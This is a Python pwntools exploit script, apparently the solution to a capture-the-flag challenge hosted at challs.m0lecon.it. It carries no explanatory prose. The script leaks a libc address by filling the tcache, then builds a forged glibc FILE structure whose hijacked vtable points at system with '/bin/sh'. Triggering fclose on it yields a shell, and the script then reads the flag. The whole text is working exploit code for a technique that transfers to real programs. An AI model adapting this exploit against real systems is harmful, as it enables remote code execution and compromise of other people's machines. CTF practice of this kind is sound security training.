from pwn import *


def open_file(io, idx, fake_idx=None):
    io.sendlineafter(':', '1')
    if fake_idx is not None:
        io.sendafter(':', fake_idx)
    else:
        io.sendlineafter(':', str(idx))


def read_content(io, idx):
    io.sendlineafter(':', '2')
    io.sendlineafter(':', str(idx))


def close_file(io):
    io.sendlineafter(':', '4')


def main():
    libc = ELF('./libc.so.6')
    io = remote('challs.m0lecon.it', 9013)

    for idx in range(1, 9):
        open_file(io, idx)
    for idx in range(8):
        close_file(io)
    log.info('tcache[0xf0] is filled up')
    
    read_content(io, 1)
    libc_arena = u64(io.recvn(17)[9:])
    libc_base  = libc_arena - 0x3ebca0
    
    log.success('libc_arena @ ' + hex(libc_arena))
    log.success('libc_base  @ ' + hex(libc_base))

    for idx in range(1, 9):
        open_file(io, idx)
    open_file(io, 1)

    vtable  = libc_base + 0x3e82a0
    rdi     = libc_base + next(libc.search('/bin/sh'))
    system  = libc_base + libc.symbols['system']
    
    fake_file = ''
    fake_file += p64(0x2000)        # flags
    fake_file += p64(0)             # _IO_read_ptr
    fake_file += p64(0)             # _IO_read_end
    fake_file += p64(0)             # _IO_read_base
    fake_file += p64(0)             # _IO_write_base
    fake_file += p64((rdi-100)/2)   # _IO_write_ptr
    fake_file += p64(0)             # _IO_write_end
    fake_file += p64(0)             # _IO_buf_base
    fake_file += p64((rdi-100)/2)   # _IO_buf_end
    fake_file += p64(0)             # _IO_save_base
    fake_file += p64(0)             # _IO_backup_base
    fake_file += p64(0)             # _IO_save_end
    fake_file += p64(0)             # _markers
    fake_file += p64(0)             # _chain
    fake_file += p64(0)             # _fileno
    fake_file += '\xff'*8
    fake_file += p64(0)
    fake_file += p64(0x602110)

    fake_file += '\xff'*8
    fake_file += p64(0)
    fake_file += p64(0x602108) # file
    fake_file += p64(0)        # next
    fake_file += p64(0)
    fake_file += p64(0)
    fake_file += p64(0)
    fake_file += p64(0)
    fake_file += p64(0)
    fake_file += p64(vtable-0x3a8-0x88) # vtable
    fake_file += p64(system)            # alloc_buffer

    payload = ''.join([
        '4'.ljust(8, '\x00'),
        fake_file
    ]).ljust(0x100, '\x00')
    io.send(payload)
    log.success('embeded fake file struct into linked list')
    log.info('triggering fclose on fake file struct...')
    
    io.sendline('cat flag.txt')

    io.interactive()


if __name__ == '__main__':
    main()